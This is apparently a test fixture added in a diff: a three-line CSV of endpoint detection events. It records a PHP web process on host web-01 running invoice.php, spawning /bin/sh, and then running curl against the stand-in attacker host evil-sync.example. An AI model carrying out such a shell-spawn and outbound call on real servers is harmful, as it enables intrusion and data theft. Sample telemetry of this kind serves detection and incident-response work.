@@ -1,0 +1,4 @@
+event_id,timestamp,host,actor,action,target,detail
+EDR-001,2026-05-20T00:14:05Z,web-01,www-data,process_start,/bin/sh,parent=php-fpm cmd=php invoice.php exec /bin/sh
+EDR-002,2026-05-20T00:14:07Z,web-01,www-data,process_start,/usr/bin/curl,parent=/bin/sh dst=evil-sync.example
+
